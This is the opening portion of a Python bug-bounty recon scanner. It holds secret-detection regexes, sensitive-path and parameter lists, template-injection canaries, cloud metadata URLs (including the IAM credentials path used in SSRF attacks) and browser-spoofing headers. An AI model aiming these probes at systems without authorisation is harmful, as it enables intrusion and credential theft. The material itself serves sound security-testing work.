#!/usr/bin/env python3
"""
bounty_recon.py — All-in-one Bug Bounty Recon, Scanner & AI Triage
======================================================================
Version : 4.0.0
License : MIT

New in v4.0 (upgraded from v3.0):
  ✦ Single tool               — AI triage folded in (claude_hunter + artemis retired)
  ✦ True concurrency          — shared HTTP/2 client + ThreadPoolExecutor (10-20x faster)
  ✦ Global rate limit + retry — token bucket (--rate), exponential backoff (--retries)
  ✦ Scan profiles             — --profile passive | safe | aggressive
  ✦ Active-probe safety gate  — intrusive OOB probes only with --active
  ✦ AI triage (3-phase)       — --ai-triage over Ollama / Groq / Anthropic, on live dicts
  ✦ AI attack plan            — --ai-plan prioritised chains from findings
  ✦ Cache-poisoning probe     — Host-override reflection + cacheability (buster-safe)
  ✦ Outdated-JS-lib detector  — retire.js-lite (jQuery/lodash/Angular/Bootstrap/Moment)
  ✦ CORS bypass matrix        — prefix/suffix/null/sibling origin tests
  ✦ HTML report               — self-contained, severity-coloured (--html)
  ✦ FP reduction              — entropy-gated secret tiers, dedup, honest SSRF severity

New in v3.0 (upgraded from v2.5):
  ✦ SSRF detection module       — common SSRF param names + OOB callback fingerprint
  ✦ Open Redirect detection     — 25+ param names, reflected origin test
  ✦ SSTI detection              — passive param injection via canary payloads
  ✦ Prototype Pollution check   — __proto__ / constructor[prototype] injection test
  ✦ GraphQL full audit          — introspection, batch, auth-less mutation probe
  ✦ WAF fingerprinting          — Cloudflare, Akamai, Imperva, ModSecurity, Barracuda
  ✦ Race condition candidates   — detects coupon/redeem/transfer endpoints
  ✦ IDN / Unicode homoglyph     — detects lookalike domain registrations
  ✦ Wayback machine canary      — parameterised URLs from Archive.org
  ✦ Parameter mining            — extracts unique param names from live + wayback URLs
  ✦ IDOR candidate detector     — flags numeric / UUID object refs in API responses
  ✦ Business logic hints        — negative value, skip-step, limit-bypass candidates
  ✦ Cloud metadata probe        — SSRF → cloud metadata via known IP ranges
  ✦ Passive LFI indicators      — path traversal param names in page source
  ✦ XXE upload surface          — flags SVG / DOCX / XML upload endpoints
  ✦ JWT cookie audit            — extended from v2.5 with alg confusion note
  ✦ ASCII summary table         — severity bar chart in terminal
  ✦ All v2.5 modules retained

Modules (full list):
  1.  Subdomain enumeration  — crt.sh + HackerTarget + AlienVault + Anubis + RapidDNS + SecurityTrails
  2.  DNS resolution          — A / CNAME / MX + SPF / DMARC / CAA
  3.  Live host detection     — concurrent HTTPS/HTTP reachability
  4.  Technology fingerprint  — Server headers, Next.js, Auth.js, Tailwind, CDNs
  5.  Endpoint sweep          — 80+ sensitive paths, Soft-404 FP filter
  6.  Security headers        — 9 required headers × all hosts + CSP analysis
  7.  TLS check               — expiry, TLS 1.0/1.1, weak ciphers
  8.  CORS check              — reflected origin + Allow-Credentials
  9.  JWKS / source map       — exposure detection
  10. GitHub recon            — repo/org secret scanning (optional)
  11. S3 / GCS / Azure        — multi-cloud public bucket check (optional)
  12. nuclei wrapper          — misconfig, headers, ssl templates
  13. JS secrets scan         — URL collection + 22-pattern regex extraction
  14. DNS takeover            — dangling CNAME detection (22+ services)
  15. GraphQL audit           — introspection, batch abuse, unauth mutation
  16. WAF fingerprinting      — vendor + evasion tip
  17. SSRF detection          — param names + OOB canary
  18. Open Redirect           — 25 param names, reflected origin
  19. SSTI canary             — template injection param probe
  20. Prototype Pollution     — __proto__ / constructor injection
  21. Race Condition hints    — coupon / transfer endpoint detection
  22. IDOR candidates         — numeric / UUID object ref in responses
  23. LFI / XXE surface       — param names + upload endpoint detection
  24. Wayback canary          — historical parameterised URL extraction
  25. Parameter mining        — unique param names from all collected URLs
  26. CVE fingerprinting      — 15+ products (passive, no exploitation)
  27. Import: Dalfox output   — parse + deduplicate XSS findings
  28. Import: nuclei JSONL    — parse + deduplicate nuclei output
  29. Markdown + JSON report  — full structured output

Usage:
  python3 bounty_recon.py -t example.com
  python3 bounty_recon.py -t example.com --nuclei --js --s3 --out-dir ./reports
  python3 bounty_recon.py -t example.com --ssrf-callback https://your.interactsh.com
  python3 bounty_recon.py -t example.com --graphql --waf --proto-pollution
  python3 bounty_recon.py -t example.com --wayback --param-mine
  python3 bounty_recon.py -t example.com --full  # enables all optional modules
  python3 bounty_recon.py --help

Requirements:
  pip install httpx dnspython rich
  playwright (optional): pip install playwright && playwright install chromium
  nuclei (optional):  go install github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest
"""

import sys, ssl, json, socket, asyncio, datetime, subprocess, argparse, re, os, warnings, base64
from urllib.parse import urljoin, urlparse, urlencode, parse_qs, urlunparse, quote, unquote
from pathlib import Path
from dataclasses import dataclass, field, asdict
from typing import Optional
import concurrent.futures
import time
import random
import string

# ── Optional deps ─────────────────────────────────────────────────────────────
try:
    import httpx
    HAS_HTTPX = True
except ImportError:
    import urllib.request, urllib.error
    HAS_HTTPX = False

try:
    import dns.resolver, dns.exception
    HAS_DNS = True
except ImportError:
    HAS_DNS = False

try:
    from rich.console import Console
    from rich.table import Table as RichTable
    from rich.panel import Panel
    from rich.progress import track
    from rich.bar import Bar
    console = Console()
    HAS_RICH = True
except ImportError:
    HAS_RICH = False
    class _C:
        def print(self,*a,**kw): print(*a)
        def rule(self,t=""): print(f"\n{'='*55} {t}")
    console = _C()

try:
    from playwright.sync_api import sync_playwright
    HAS_PLAYWRIGHT = True
except ImportError:
    HAS_PLAYWRIGHT = False

# ── Constants ─────────────────────────────────────────────────────────────────
VERSION  = "4.3.0"
TIMEOUT  = 12
UA = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36"
BROWSER_HEADERS = {
    "User-Agent": UA,
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.9",
    "Accept-Encoding": "gzip, deflate, br",
    "Sec-Ch-Ua": '"Chromium";v="128", "Not;A=Brand";v="24", "Google Chrome";v="128"',
    "Sec-Ch-Ua-Mobile": "?0",
    "Sec-Ch-Ua-Platform": '"macOS"',
    "Sec-Fetch-Dest": "document",
    "Sec-Fetch-Mode": "navigate",
    "Sec-Fetch-Site": "none",
    "Sec-Fetch-User": "?1",
    "Upgrade-Insecure-Requests": "1",
}

# ── JS secret patterns ────────────────────────────────────────────────────────
JS_SECRET_PATTERNS = {
    "AWS Access Key":        r'AKIA[0-9A-Z]{16}',
    "AWS Secret Key":        r'aws.{0,20}secret.{0,20}["\'][0-9a-zA-Z/+]{40}["\']',
    "OpenAI Key":            r'sk-[a-zA-Z0-9]{20,}',
    "Google API Key":        r'AIza[0-9A-Za-z\-_]{35}',
    "GitHub Token":          r'gh[pousr]_[A-Za-z0-9]{36,}',
    "JWT Token":             r'ey[A-Za-z0-9_-]{15,}\.[A-Za-z0-9_-]{15,}\.[A-Za-z0-9_-]{10,}',
    "Bearer Token":          r'[Bb]earer\s+[A-Za-z0-9\-_\.]{20,}',
    "Slack Token":           r'xox[baprs]-[0-9A-Za-z\-]{10,}',
    "Slack Webhook":         r'https://hooks\.slack\.com/services/T[a-zA-Z0-9_]+/B[a-zA-Z0-9_]+/[a-zA-Z0-9_]+',
    "Stripe Key":            r'sk_live_[0-9a-zA-Z]{24,}',
    "SendGrid Key":          r'SG\.[A-Za-z0-9\-_]{22,}',
    "Mailgun API Key":       r'key-[0-9a-zA-Z]{32}',
    "Shopify Token":         r'shpat_[a-fA-F0-9]{32}',
    "Twilio SID":            r'AC[a-z0-9]{32}',
    "Twilio Token":          r'twilio.{0,20}["\'][a-zA-Z0-9]{32}["\']',
    "Firebase URL":          r'https://[a-z0-9\-]+\.firebaseio\.com',
    "Cloudinary URL":        r'cloudinary://[0-9a-zA-Z]+:[A-Za-z0-9\-_]+@[a-zA-Z0-9]+',
    "Generic API Key":       r'["\']api[_-]?key["\']\s*[:=]\s*["\'][A-Za-z0-9\-_]{16,}["\']',
    "Generic Secret":        r'["\']secret["\']\s*[:=]\s*["\'][A-Za-z0-9\-_]{16,}["\']',
    "Password in URL":       r'https?://[a-zA-Z0-9_\-\.%]+:[^@/?#\s"\'`<>{}]{3,}@[a-zA-Z0-9_\-\.]+(?::\d+)?(?:/[^"\'`\s<>{}]*)?',
    "Internal IP":           r'(?:10\.\d{1,3}\.\d{1,3}\.\d{1,3}|172\.(?:1[6-9]|2\d|3[01])\.\d{1,3}\.\d{1,3}|192\.168\.\d{1,3}\.\d{1,3})',
    "Hardcoded Password":    r'(?:password|passwd|pwd)\s*[=:]\s*["\'][^"\']{6,}["\']',
}

# Per-pattern severity + whether to apply a Shannon-entropy gate. The old code
# marked almost everything "Critical", which flooded reports with noise. These
# tiers reflect real exploitability / false-positive rate of each pattern.
#   high-signal  : format is distinctive and rarely a false match → Critical
#   medium-signal: plausible secret but context-dependent          → High
#   low-signal   : often public / FP-prone, needs entropy or review → Low/Info
SECRET_SEVERITY = {
    "AWS Access Key": "Critical", "AWS Secret Key": "Critical",
    "Stripe Key": "Critical", "Shopify Token": "Critical",
    "GitHub Token": "Critical", "Slack Token": "Critical",
    "Slack Webhook": "Critical", "SendGrid Key": "Critical",
    "Twilio Token": "High", "Mailgun API Key": "High",
    "Cloudinary URL": "High", "Password in URL": "High",
    "Hardcoded Password": "High",
    # FP-prone / frequently public → low by default, promoted only on high entropy
    "OpenAI Key": "Medium", "Google API Key": "Low", "Twilio SID": "Low",
    "Generic API Key": "Medium", "Generic Secret": "Medium",
    "Bearer Token": "Low", "Firebase URL": "Info", "Internal IP": "Info",
    "JWT Token": "Info",
}
# Patterns that must clear an entropy threshold on the captured token to count.
ENTROPY_GATED = {"OpenAI Key", "Generic API Key", "Generic Secret", "Bearer Token", "Google API Key"}

def shannon_entropy(s: str) -> float:
    """Bits-per-char Shannon entropy — used to suppress low-randomness FPs."""
    if not s:
        return 0.0
    from math import log2
    freq = {c: s.count(c) for c in set(s)}
    n = len(s)
    return -sum((cnt / n) * log2(cnt / n) for cnt in freq.values())

def _longest_token(match) -> str:
    """Regex matches may be a string or a tuple of groups — pick the longest."""
    if isinstance(match, tuple):
        match = max(match, key=len) if match else ""
    return match or ""

DUMMY_USERS = {"user","username","login","name","admin","root","test","demo","guest","foo","git","john","alice","email","null","undefined","account"}
DUMMY_PASSWORDS = {"pass","password","secret","admin","root","test","demo","guest","bar","baz","123456","changeme","dummy","xxx","token","null","undefined","placeholder"}
DUMMY_HOSTS = {"localhost","127.0.0.1","0.0.0.0","::1","example.com","example.org","example.net","test.com","test.org","test.net","test.local","domain.com","sample.com","foo.com","bar.com","w3.org","schema.org","iana.org","ietf.org","invalid","local","internal","placeholder.com","your-domain.com","yourdomain.com","mydomain.com","hostname.com","mysite.com","acme.com","user.example","auth.example","api.example","db.example","redis.example","mongo.example"}
_DUMMY_HOST_SUBSTRINGS = ("example","placeholder","yoursite","yourdomain","localhost","127.0.0","acme.test","demo.test",)

def is_valid_secret_url(matched_url: str) -> bool:
    try:
        p = urlparse(matched_url)
        user   = (p.username or "").lower()
        passwd = (p.password or "").lower()
        host   = (p.hostname or "").lower()
        if not host: return False
        if host in DUMMY_HOSTS: return False
        if any(host.endswith("." + d) for d in DUMMY_HOSTS): return False
        if any(sub in host for sub in _DUMMY_HOST_SUBSTRINGS): return False
        parts = host.split(".")
        if len(parts) < 2 or len(parts[-1]) < 2 or parts[-1].isdigit(): return False
        if not passwd or len(passwd) < 6: return False
        if passwd in DUMMY_PASSWORDS: return False
        if any(m in passwd for m in ["${","{{","<%","<",">","%s","%d","todo","replace","changeme","xxx","your_","insert_","put_your","password"]): return False
        if user in DUMMY_USERS: return False
        return True
    except Exception:
        return False

def mask_url_password(matched_url: str) -> str:
    try:
        p = urlparse(matched_url)
        if p.password:
            masked_netloc = f"{p.username or ''}:*****@{p.hostname or ''}"
            if p.port:
                masked_netloc += f":{p.port}"
            return urlunparse((p.scheme, masked_netloc, p.path, p.params, p.query, p.fragment))
    except Exception:
        pass
    return matched_url[:50] + "..."

# ── CNAME takeover fingerprints ───────────────────────────────────────────────
TAKEOVER_FINGERPRINTS = {
    "github.io":          "There isn't a GitHub Pages site here",
    "heroku.com":         "No such app",
    "shopify.com":        "Sorry, this shop is currently unavailable",
    "fastly.net":         "Fastly error: unknown domain",
    "amazonaws.com":      "NoSuchBucket",
    "azurewebsites.net":  "404 Web Site not found",
    "cloudfront.net":     "Bad request",
    "bitbucket.io":       "Repository not found",
    "zendesk.com":        "Help Center Closed",
    "readme.io":          "Project doesnt exist",
    "surge.sh":           "project not found",
    "ghost.io":           "Failed to load resource",
    "pantheon.io":        "The gods are wise",
    "tumblr.com":         "Whatever you were looking for doesn't currently exist",
    "wordpress.com":      "Do you want to register",
    "netlify.app":        "Not Found - Request ID",
    "fly.dev":            "404 Not Found",
    "vercel.app":         "The deployment could not be found",
    "pages.dev":          "1101",
    "gitbook.io":         "Not Found",
    "helpscout.net":      "No settings were found for this company",
    "campaignmonitor.com":"Trying to access your account?",
}

# ── Sensitive paths ───────────────────────────────────────────────────────────
SENSITIVE_PATHS = [
    "/.env","/.env.local","/.env.production","/.env.backup","/.env.dev","/.env.staging",
    "/config.json","/config.yaml","/settings.json","/app.json","/app.config.js",
    "/.git/HEAD","/.git/config","/.git/COMMIT_EDITMSG","/.git/index","/.git/logs/HEAD",
    "/backup.sql","/dump.sql","/db.sqlite","/database.sqlite","/backup.zip","/db_backup.sql",
    "/main.js.map","/app.js.map","/bundle.js.map","/vendor.js.map",
    "/static/js/main.chunk.js.map","/static/js/bundle.js.map",
    "/.well-known/jwks.json","/.well-known/openid-configuration",
    "/.well-known/security.txt","/.well-known/change-password",
    "/api/v1/health","/api/v1/ready","/api/v1/debug","/api/v1/env",
    "/api/v1/config","/api/v1/metrics","/api/v1/stream/demo",
    "/api/v1/version","/api/v1/info","/api/v1/admin","/api/v1/users",
    "/api/v2/health","/api/v2/users","/api/v2/admin",
    "/api/health","/api/status","/api/debug","/api/users","/api/admin",
    "/health","/ready","/status","/ping","/version",
    "/metrics","/prometheus","/debug/pprof","/debug/vars",
    "/docs","/openapi.json","/swagger","/swagger.json","/swagger-ui.html",
    "/api-docs","/redoc","/graphql","/graphiql","/graph",
    "/admin","/admin/login","/admin/dashboard","/_admin","/_debug","/_metrics",
    "/wp-admin","/wp-login.php","/phpmyadmin","/adminer.php",
    "/rest/settings","/rest/license","/rest/owner","/rest/debug",
    "/rest/users","/rest/api-keys","/rest/workflows","/rest/credentials",
    "/actuator","/actuator/health","/actuator/env",
    "/actuator/info","/actuator/mappings","/actuator/beans","/actuator/httptrace",
    "/server-status","/server-info",
    "/_next/static/","/__webpack_hmr",
    "/robots.txt","/sitemap.xml","/crossdomain.xml","/clientaccesspolicy.xml",
    "/.DS_Store","/.htaccess","/.htpasswd",
]

# Public/benign files that live in SENSITIVE_PATHS only as "worth reading", NOT
# as vulnerabilities — reporting these as High is pure noise to a triager.
BENIGN_PATHS = {
    "/robots.txt", "/sitemap.xml", "/crossdomain.xml", "/clientaccesspolicy.xml",
    "/.well-known/security.txt", "/.well-known/change-password",
    "/.well-known/openid-configuration", "/.well-known/jwks.json",
}
# Substrings that mark a genuinely dangerous exposure (secrets, VCS, DB, debug).
_CRITICAL_MARKERS = (".env", ".git/", ".htpasswd", "backup", "dump.sql", ".sqlite",
                     "db_backup", "id_rsa", "credentials", "/adminer", "/phpmyadmin")
_HIGH_MARKERS     = ("/metrics", "/actuator", "debug", "/env", "swagger", "openapi",
                     "/.ds_store", "/config", "/.htaccess", "server-status",
                     "/graphql", "pprof", "/rest/")

def endpoint_severity(url_or_path: str) -> str:
    """Grade a discovered endpoint instead of calling everything High.
    Benign public files → Info; secrets/VCS/DB → Critical; metrics/debug/config
    /admin panels → High; everything else that's reachable+non-HTML → Medium."""
    p = urlparse(url_or_path).path.lower() if "://" in url_or_path else url_or_path.lower()
    if p in BENIGN_PATHS:
        return "Info"
    if any(m in p for m in _CRITICAL_MARKERS):
        return "Critical"
    if any(m in p for m in _HIGH_MARKERS):
        return "High"
    return "Medium"

# ── Security headers ──────────────────────────────────────────────────────────
REQUIRED_HEADERS = {
    "content-security-policy":       ("Medium", "CSP missing — XSS risk increased"),
    "x-content-type-options":        ("Low",    "MIME-type sniffing enabled"),
    "x-frame-options":               ("Medium", "Clickjacking possible"),
    "strict-transport-security":     ("Medium", "HSTS missing — MITM risk"),
    "permissions-policy":            ("Low",    "Browser feature policy not set"),
    "referrer-policy":               ("Low",    "Referrer data may leak to third parties"),
    "cross-origin-opener-policy":    ("Low",    "COOP missing"),
    "cross-origin-embedder-policy":  ("Low",    "COEP missing"),
    "cross-origin-resource-policy":  ("Low",    "CORP missing"),
}

# ── SSRF parameter names ──────────────────────────────────────────────────────
SSRF_PARAMS = [
    "url","src","dest","destination","redirect","redirect_uri","redirect_url",
    "return","returnTo","return_url","return_to","next","goto","link","ref",
    "feed","webhook","callback","hook","ping","load","fetch","proxy","img",
    "image","img_url","image_url","icon","logo","avatar","path","resource",
    "source","from","page","site","domain","host","port","server","addr",
    "address","target","data","uri","remote","location","continue",
]

# ── Open redirect parameter names ─────────────────────────────────────────────
REDIRECT_PARAMS = [
    "redirect","redirect_uri","redirect_url","return","returnTo","return_url",
    "return_to","next","goto","link","url","dest","destination","continue",
    "target","redir","r","successUrl","failureUrl","cancelUrl","from","back",
    "forward","location","ref","referrer","homepage","exit","fallback",
]

# ── LFI / path traversal parameter names ─────────────────────────────────────
LFI_PARAMS = [
    "file","page","path","include","module","template","doc","document",
    "folder","root","src","resource","dir","layout","conf","config",
    "lang","language","locale","theme","skin","plugin","component","section",
    "chapter","article","item","view","load","content","data","type","name",
]

# ── SSTI canary payloads (safe, non-destructive) ──────────────────────────────
SSTI_CANARIES = [
    ("{{7*7}}",      "49",  "Jinja2/Twig"),
    ("${7*7}",       "49",  "Freemarker/Velocity"),
    ("<%= 7*7 %>",   "49",  "ERB (Ruby)"),
    ("#{7*7}",       "49",  "Ruby non-ERB"),
    ("*{7*7}",       "49",  "Spring (Java)"),
]

# ── GraphQL introspection query ───────────────────────────────────────────────
GRAPHQL_INTROSPECT = '{"query":"{__schema{types{name}}}"}'
GRAPHQL_BATCH_TEST = '[{"query":"{__typename}"},{"query":"{__typename}"}]'

# ── WAF signatures ────────────────────────────────────────────────────────────
WAF_SIGNATURES = {
    "Cloudflare":   ["cf-ray", "cf-cache-status", "server: cloudflare", "__cfduid"],
    "Akamai":       ["akamai-grn", "x-akamai-transformed", "x-check-cacheable"],
    "Imperva":      ["x-iinfo", "visid_incap", "_incapsula_", "incapsula"],
    "AWS WAF":      ["x-amzn-waf", "awselb", "x-amz-cf-id"],
    "Sucuri":       ["x-sucuri-id", "x-sucuri-cache"],
    "F5 BIG-IP":    ["bigipserver", "x-cnection", "x-wa-info"],
    "ModSecurity":  ["mod_security", "modsec", "x-mod-security"],
    "Barracuda":    ["barra_counter_session", "barracuda"],
    "Fortinet":     ["fortigate", "fortiweb", "x-waf-event-info"],
    "Sophos":       ["x-sxf-cid", "sophosxl"],
}

# ── Cloud metadata IPs ────────────────────────────────────────────────────────
CLOUD_METADATA_TARGETS = {
    "AWS IMDSv1":   "http://169.254.169.254/latest/meta-data/",
    "AWS IMDSv1 IAM": "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
    "GCP":          "http://metadata.google.internal/computeMetadata/v1/",
    "Azure":        "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
    "DigitalOcean": "http://169.254.169.254/metadata/v1/",
}

# ── CVE fingerprint checks ────────────────────────────────────────────────────
CVE_CHECKS = [
    {"cve":"CVE-2024-1709","product":"ConnectWise ScreenConnect","severity":"Critical",
     "paths":["/SetupWizard.aspx","/SetupWizard.aspx/"],
     "match":["SetupWizard","ScreenConnect","connectwise"],
     "detail":"ConnectWise ScreenConnect SetupWizard endpoint exposed — CVE-2024-1709 (auth bypass, CVSS 10.0)",
     "remediation":"Upgrade ScreenConnect to 23.9.8+. Block /SetupWizard.aspx at edge."},
    {"cve":"CVE-2023-34362","product":"MOVEit Transfer","severity":"Critical",
     "paths":["/human.aspx","/api/v1/token","/moveit/","/MOVEitTransfer/"],
     "match":["MOVEit","Progress MOVEit","moveit.php"],
     "detail":"MOVEit Transfer login page detected — CVE-2023-34362 (unauthenticated SQLi → RCE)",
     "remediation":"Apply MOVEit security patches immediately. Restrict public access."},
    {"cve":"CVE-2023-4966","product":"Citrix NetScaler","severity":"Critical",
     "paths":["/oauth/idp/.well-known/openid-configuration","/nf/auth/doAuthentication.do"],
     "match":["citrix","netscaler","ns_af=","NSC_","csg_tunnel"],
     "detail":"Citrix NetScaler detected — CVE-2023-4966 (Citrix Bleed, session token leak)",
     "remediation":"Apply Citrix security bulletin CTX579459 patches immediately."},
    {"cve":"CVE-2023-51467","product":"Apache OFBiz","severity":"Critical",
     "paths":["/webtools/control/ProgramExport","/webtools/control/main"],
     "match":["OFBiz","Apache OFBiz","ofbiz"],
     "detail":"Apache OFBiz detected — CVE-2023-51467 (auth bypass → RCE)",
     "remediation":"Upgrade to Apache OFBiz 18.12.11+"},
    {"cve":"N-Central 0-Day","product":"N-Central N-Able","severity":"Critical",
     "paths":["/dms2/services/","/dms/services/ServerMMS2","/mms3/","/dms2/"],
     "match":["ServerMMS","N-central","N-able","ncentral","nable"],
     "detail":"N-Central N-Able MMS service endpoint exposed — multiple unauthenticated RCE 0-days",
     "remediation":"Restrict MMS endpoints to internal/WARP only. Apply latest N-Central patches."},
    {"cve":"IBM Novalink 0-Day","product":"IBM PowerVM Novalink","severity":"Critical",
     "paths":["/api/v1/","/api/v1/lpars","/api/v1/info"],
     "match":["novalink","PowerVM","IBM PowerVM","prsm"],
     "detail":"IBM PowerVM Novalink REST API exposed — unauthenticated RCE 0-days known",
     "remediation":"Restrict Novalink REST API to management VLAN only."},
    {"cve":"CVE-2018-14486","product":"DotNetNuke (DNN)","severity":"High",
     "paths":["/DesktopModules/","/Portals/"],
     "match":["DotNetNuke","DNN Platform","DesktopModules","__dnnVariable"],
     "detail":"DotNetNuke installation detected — multiple XSS/injection CVEs",
     "remediation":"Upgrade DNN to latest version."},
    {"cve":"INFO","product":"phpMyAdmin","severity":"High",
     "paths":["/phpmyadmin/","/pma/","/phpMyAdmin/"],
     "match":["phpMyAdmin","pma_username","PMA_VERSION"],
     "detail":"phpMyAdmin panel publicly accessible",
     "remediation":"Restrict phpMyAdmin to localhost or management IP. Use SSH tunnel."},
    {"cve":"INFO","product":"Spring Boot Actuator","severity":"High",
     "paths":["/actuator/env","/actuator/mappings","/actuator/beans"],
     "match":["spring","actuator","activeProfiles","classLoader"],
     "detail":"Spring Boot Actuator env endpoint exposed — discloses environment variables",
     "remediation":"Disable Actuator in production or restrict to management port."},
    {"cve":"CVE-2023-38826","product":"Follett Destiny","severity":"Critical",
     "paths":["/common/","/destiny/","/logon.jsp"],
     "match":["Destiny","Follett","Library Manager","destiny/logon"],
     "detail":"Follett Destiny Library Manager detected — CVE-2023-38826/38827 (unauthenticated RCE)",
     "remediation":"Apply Follett security patches immediately."},
    {"cve":"WordPress User Enum","product":"WordPress","severity":"Medium",
     "paths":["/wp-json/wp/v2/users","/wp-json/wp/v2/users?per_page=10"],
     "match":['"slug"','"link"','"avatar_urls"','"_links"'],
     "detail":"WordPress REST API leaks user accounts — user enumeration possible",
     "remediation":"Disable user endpoint: add_filter('rest_endpoints', ...) or use plugin."},
]

SEV_ORDER = {"Critical":0,"High":1,"Medium":2,"Low":3,"Info":4}
SEV_EMOJI = {"Critical":"🔴","High":"🟠","Medium":"🟡","Low":"🔵","Info":"⚪"}

# ── Data models ───────────────────────────────────────────────────────────────
@dataclass
class ScanResult:
    target:        str
    timestamp:     str = field(default_factory=lambda: datetime.datetime.now(datetime.timezone.utc).strftime("%Y-%m-%dT%H:%M:%SZ"))
    subdomains:    list = field(default_factory=list)
    dns_records:   dict = field(default_factory=dict)
    live_hosts:    list = field(default_factory=list)
    technologies:  dict = field(default_factory=dict)
    findings:      list = field(default_factory=list)
    passed:        list = field(default_factory=list)
    routes:        list = field(default_factory=list)
    endpoints:     list = field(default_factory=list)
    oauth_params:  list = field(default_factory=list)
    parameters:    list = field(default_factory=list)
    waf_detected:  dict = field(default_factory=dict)
    ai_triage:     list = field(default_factory=list)
    ai_plan:       str  = ""
    summary:       dict = field(default_factory=dict)

# ── HTTP infrastructure: shared client, rate limiter, retry, concurrency ───────
# Runtime config — set once in main() via configure_http(). Sensible defaults so
# the module is still importable/usable without an explicit configure call.
HTTP_CFG = {
    "threads":  20,     # ThreadPoolExecutor workers for concurrent fan-out
    "rate":     0.0,    # global requests/sec cap (0 = unlimited)
    "retries":  2,      # retry attempts on transient network errors
    "timeout":  TIMEOUT,
    "active":   False,  # gate for intrusive (injection) probes
    "verbose":  False,
}

class _RateLimiter:
    """Thread-safe token bucket. rate<=0 means unlimited (no blocking)."""
    def __init__(self, rate: float):
        self.rate = rate
        self.capacity = max(rate, 1.0)
        self.tokens = self.capacity
        self.updated = time.monotonic()
        self._lock = __import__("threading").Lock()

    def acquire(self):
        if self.rate <= 0:
            return
        with self._lock:
            now = time.monotonic()
            self.tokens = min(self.capacity, self.tokens + (now - self.updated) * self.rate)
            self.updated = now
            if self.tokens < 1.0:
                sleep_for = (1.0 - self.tokens) / self.rate
                time.sleep(sleep_for)
                self.tokens = 0.0
                self.updated = time.monotonic()
            else:
                self.tokens -= 1.0

_RL = _RateLimiter(0.0)
_CLIENT = None
_CLIENT_LOCK = __import__("threading").Lock()

def configure_http(threads=None, rate=None, retries=None, timeout=None, active=None, verbose=None):
    global _RL
    if threads is not None:  HTTP_CFG["threads"] = max(1, int(threads))
    if rate    is not None:  HTTP_CFG["rate"]    = float(rate)
    if retries is not None:  HTTP_CFG["retries"] = max(0, int(retries))
    if timeout is not None:  HTTP_CFG["timeout"] = int(timeout)
    if active  is not None:  HTTP_CFG["active"]  = bool(active)
    if verbose is not None:  HTTP_CFG["verbose"] = bool(verbose)
    _RL = _RateLimiter(HTTP_CFG["rate"])

def _get_client():
    """Lazily build one shared httpx.Client (connection pooling + HTTP/2)."""
    global _CLIENT
    if not HAS_HTTPX:
        return None
    if _CLIENT is None:
        with _CLIENT_LOCK:
            if _CLIENT is None:
                limits = httpx.Limits(max_connections=max(HTTP_CFG["threads"] * 2, 40),
                                      max_keepalive_connections=max(HTTP_CFG["threads"], 20))
                try:
                    _CLIENT = httpx.Client(http2=True, verify=True, limits=limits,
                                           trust_env=False, headers=BROWSER_HEADERS)
                except Exception:
                    # h2 not installed → fall back to HTTP/1.1
                    _CLIENT = httpx.Client(http2=False, verify=True, limits=limits,
                                           trust_env=False, headers=BROWSER_HEADERS)
    return _CLIENT

def close_client():
    global _CLIENT
    if _CLIENT is not None:
        try: _CLIENT.close()
        except Exception: pass
        _CLIENT = None

def http_get(url: str, headers: dict = None, follow: bool = True, timeout: int = None,
             method: str = "GET", body: str = None):
    """Single HTTP request through the shared client, with rate limiting + retry.

    Returns (status_code, headers_dict, body_bytes). Raises ConnectionError on
    unrecoverable failure (callers already wrap this in try/except)."""
    timeout = timeout or HTTP_CFG["timeout"]
    h = dict(BROWSER_HEADERS)
    if headers:
        h.update(headers)
    attempts = HTTP_CFG["retries"] + 1
    last_err = None

    for attempt in range(attempts):
        _RL.acquire()
        try:
            if HAS_HTTPX:
                client = _get_client()
                if method == "POST":
                    r = client.post(url, headers=h, timeout=timeout,
                                    follow_redirects=follow, content=body)
                else:
                    r = client.request(method, url, headers=h, timeout=timeout,
                                       follow_redirects=follow)
                return r.status_code, dict(r.headers), r.content
            else:
                import urllib.request as ur, urllib.error as ue, ssl as _ssl
                ctx = _ssl.create_default_context()
                req = ur.Request(url, headers=h, data=body.encode() if body else None, method=method)
                try:
                    with ur.urlopen(req, context=ctx, timeout=timeout) as resp:
                        return resp.status, {k.lower(): v for k,v in resp.headers.items()}, resp.read()
                except ue.HTTPError as e:
                    body_r = b""
                    try: body_r = e.read()
                    except Exception: pass
                    hdrs = {k.lower(): v for k,v in e.headers.items()} if e.headers else {}
                    return e.code, hdrs, body_r
        except Exception as e:
            last_err = e
            # Retry only transient classes; honour a short exponential backoff.
            if attempt < attempts - 1:
                time.sleep(min(0.5 * (2 ** attempt), 4.0) + random.random() * 0.2)
                continue
    raise ConnectionError(str(last_err))

def threaded_map(fn, items, workers: int = None, label: str = ""):
    """Run fn over items concurrently; return list of (item, result|None).

    Exceptions from fn are swallowed (result=None) so one bad host never aborts
    a whole phase — matching the tool's existing best-effort philosophy."""
    items = list(items)
    if not items:
        return []
    workers = workers or HTTP_CFG["threads"]
    workers = max(1, min(workers, len(items)))
    out = []
    with concurrent.futures.ThreadPoolExecutor(max_workers=workers) as ex:
        futures = {ex.submit(fn, it): it for it in items}
        for fut in concurrent.futures.as_completed(futures):
            it = futures[fut]
            try:
                out.append((it, fut.result()))
            except Exception as e:
                if HTTP_CFG["verbose"]:
                    console.print(f"  [dim]! {label} {it}: {e}[/dim]" if HAS_RICH else f"  ! {label} {it}: {e}")
                out.append((it, None))
    return out

def norm_headers(hdrs: dict) -> dict:
    return {k.lower(): v for k,v in hdrs.items()}

def is_html(ct: str, body: bytes) -> bool:
    if "text/html" in (ct or "").lower(): return True
    snip = body[:300].lower()
    return b"<!doctype" in snip or b"<html" in snip

def is_waf_challenge(status: int, headers: dict, body: bytes) -> tuple:
    h = norm_headers(headers)
    body_text = body[:3000].decode("utf-8", "replace").lower()
    if status == 403:
        if "attention required! | cloudflare" in body_text or "cf-ray" in h: return True,"Cloudflare"
        if "incapsula" in body_text or "imperva" in body_text: return True,"Imperva"
        if "akamai" in body_text: return True,"Akamai"
    if status in (429,503):
        if "just a moment..." in body_text or "checking your browser" in body_text: return True,"Cloudflare"
    return False,""

